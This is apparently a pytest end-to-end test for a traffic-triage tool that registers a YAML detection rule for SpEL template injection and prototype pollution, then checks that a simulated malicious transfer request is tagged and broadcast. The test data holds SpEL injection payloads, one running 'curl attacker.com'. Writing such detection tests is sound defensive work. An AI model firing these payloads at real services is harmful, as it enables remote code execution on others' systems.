"""
Tier 4 Real-World Application Scenario 4: Custom 0-Day Rule Detection & API Graph Lineage Pipeline.
Exercises: Custom YAML/JSON Rule Registration, Real-Time Flow Matching,
Pub/Sub Event Streaming, Anomaly Severity Propagation, and Parameter Lineage Tracing.
"""

from __future__ import annotations

import asyncio
import time
import uuid
import pytest
import yaml
from httpx import AsyncClient, ASGITransport

from flowforge.api.app import create_app
from flowforge.config import Settings
from flowforge.core.broadcaster import EventBroadcaster
from flowforge.db.connection import init_db
from flowforge.heuristics.models import EndpointCategory, FindingSeverity
from flowforge.heuristics.pipeline import TriagePipeline
from flowforge.heuristics.rule_engine import RuleEngine
from flowforge.models.events import FlowEvent
from flowforge.models.flow import FlowRecord, RequestModel, ResponseModel
from flowforge.models.rules import MatchRule, RuleCondition, RuleOperator, RuleSeverity


async def test_e2e_zeroday_rule_and_lineage_graph_workflow(tmp_dir: str):
    """
    Execute full end-to-end 0-day rule detection and parameter lineage workflow:
    1. Simulate multi-step API conversational flows (Auth -> Profile -> State Action).
    2. Register custom 0-Day exploit detection rule via YAML / REST API.
    3. Evaluate live incoming malicious traffic against dynamic rules.
    4. Assert real-time rule match, custom tag injection, and broadcast event dispatch.
    5. Verify parameter and token lineage propagation between multi-stage requests.
    6. Verify rule management lifecycle (CRUD, toggle, live tester endpoint).
    """
    db_path = f"{tmp_dir}/zeroday_rule_workflow.db"
    settings = Settings(db_path=db_path, auto_start_proxy=False)
    app = create_app(settings)
    await init_db(db_path)

    rule_engine = RuleEngine(load_defaults=False)
    pipeline = TriagePipeline(rule_engine=rule_engine)
    broadcaster = EventBroadcaster()

    async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
        # -------------------------------------------------------------------
        # Step 1: Subscribe Real-Time Streaming Client
        # -------------------------------------------------------------------
        ws_queue = await broadcaster.subscribe("operator-cockpit-ws")

        # -------------------------------------------------------------------
        # Step 2: Multi-Stage Conversational Flows (Parameter Lineage)
        # -------------------------------------------------------------------
        session_token = "sess_tok_99182aef43b"
        user_uuid = "usr_88201"

        # Stage 1: Authentication Login
        flow_login = FlowRecord(
            id=str(uuid.uuid4()),
            timestamp_start=time.time(),
            server_host="api.fintech.cloud",
            request=RequestModel(
                method="POST",
                url="https://api.fintech.cloud/api/v1/auth/login",
                path="/api/v1/auth/login",
                body='{"username": "sec_operator", "password": "supersecretpassword"}',
            ),
            response=ResponseModel(
                status_code=200,
                headers={"Content-Type": "application/json"},
                body=f'{{"status": "ok", "token": "{session_token}", "user_id": "{user_uuid}"}}',
            ),
        )
        triage_login = pipeline.process_flow_sync(flow_login)
        assert triage_login.endpoint_category == EndpointCategory.AUTH_SESSION

        # Stage 2: Profile Fetch using Token
        flow_profile = FlowRecord(
            id=str(uuid.uuid4()),
            timestamp_start=time.time() + 1.0,
            server_host="api.fintech.cloud",
            request=RequestModel(
                method="GET",
                url=f"https://api.fintech.cloud/api/v1/users/{user_uuid}/profile",
                path=f"/api/v1/users/{user_uuid}/profile",
                headers={"Authorization": f"Bearer {session_token}"},
            ),
            response=ResponseModel(
                status_code=200,
                headers={"Content-Type": "application/json"},
                body=f'{{"user_id": "{user_uuid}", "role": "financial_operator", "tier": "gold"}}',
            ),
        )
        triage_profile = pipeline.process_flow_sync(flow_profile)
        assert "auth" in triage_profile.tags

        # -------------------------------------------------------------------
        # Step 3: Register Custom 0-Day Exploit Rule via Rules API
        # -------------------------------------------------------------------
        rule_yaml = """
id: rule-cve-2026-zeroday
name: Critical Remote Template & Command Injection Probe
description: Detects zero-day SSTI and expression injection patterns in input parameters
severity: CRITICAL
category: EXPLOIT_ZERO_DAY
tags:
  - zero_day_detected
  - rce_probe
condition_combinator: any
conditions:
  - field: request_body
    operator: contains
    value: '${T(java.lang.Runtime).getRuntime().exec('
  - field: query_param
    operator: regex
    value: '(?i)__proto__|constructor\\.prototype'
  - field: path
    operator: contains
    value: '/api/v1/debug/eval'
"""
        create_resp = await client.post("/api/v1/rules/import", json={"content": rule_yaml, "format": "yaml"})
        assert create_resp.status_code == 200
        import_data = create_resp.json()
        assert import_data["status"] == "success"
        assert import_data["imported_count"] >= 1

        # Also register directly in active pipeline rule engine
        imported_rules = RuleEngine.parse_rules_from_yaml(rule_yaml)
        for r in imported_rules:
            rule_engine.register_rule(r)

        # Verify rule is registered in the API
        list_resp = await client.get("/api/v1/rules")
        assert list_resp.status_code == 200
        rules_list = list_resp.json()
        rule_ids = [r["id"] for r in rules_list.get("rules", rules_list.get("items", []))]
        assert "rule-cve-2026-zeroday" in rule_ids

        # -------------------------------------------------------------------
        # Step 4: Intercept 0-Day Malicious Exploit Flow
        # -------------------------------------------------------------------
        malicious_flow_id = str(uuid.uuid4())
        flow_exploit = FlowRecord(
            id=malicious_flow_id,
            timestamp_start=time.time() + 2.0,
            server_host="api.fintech.cloud",
            request=RequestModel(
                method="POST",
                url="https://api.fintech.cloud/api/v1/transfers",
                path="/api/v1/transfers",
                headers={
                    "Authorization": f"Bearer {session_token}",
                    "Content-Type": "application/json",
                },
                body='{"amount": 50000, "memo": "${T(java.lang.Runtime).getRuntime().exec(\\"curl attacker.com\\")}"}',
            ),
            response=ResponseModel(
                status_code=500,
                headers={"Content-Type": "application/json"},
                body='{"error": "ExpressionEvaluationException", "message": "Failed to evaluate SpEL template"}',
            ),
        )

        triage_exploit = pipeline.process_flow_sync(flow_exploit)

        # Verify 0-day tags attached and high priority anomaly triggered
        assert "zero_day_detected" in triage_exploit.tags
        assert "rce_probe" in triage_exploit.tags
        assert triage_exploit.has_high_priority_anomalies is True
        assert len(triage_exploit.rule_matches) >= 1

        # Broadcast event
        broadcaster.broadcast_triage_annotated(malicious_flow_id, triage_exploit)

        # -------------------------------------------------------------------
        # Step 5: Verify Real-Time Streaming Event Delivery
        # -------------------------------------------------------------------
        received_event: FlowEvent = await asyncio.wait_for(ws_queue.get(), timeout=1.0)
        assert received_event.event == "triage_annotated"
        assert received_event.flow_id == malicious_flow_id
        assert "zero_day_detected" in received_event.data["tags"]

        # -------------------------------------------------------------------
        # Step 6: Test Rule Evaluation Sandbox via POST /api/v1/rules/test
        # -------------------------------------------------------------------
        test_payload = {
            "rule": imported_rules[0].model_dump(),
            "sample_flow": {
                "method": "POST",
                "url": "https://api.fintech.cloud/api/v1/transfers",
                "request_body": '{"memo": "${T(java.lang.Runtime).getRuntime().exec(\\"id\\")}"}',
                "response_status": 200,
            },
        }
        test_resp = await client.post("/api/v1/rules/test", json=test_payload)
        assert test_resp.status_code == 200
        test_result = test_resp.json()
        assert test_result["matched"] is True

        await broadcaster.unsubscribe("operator-cockpit-ws")
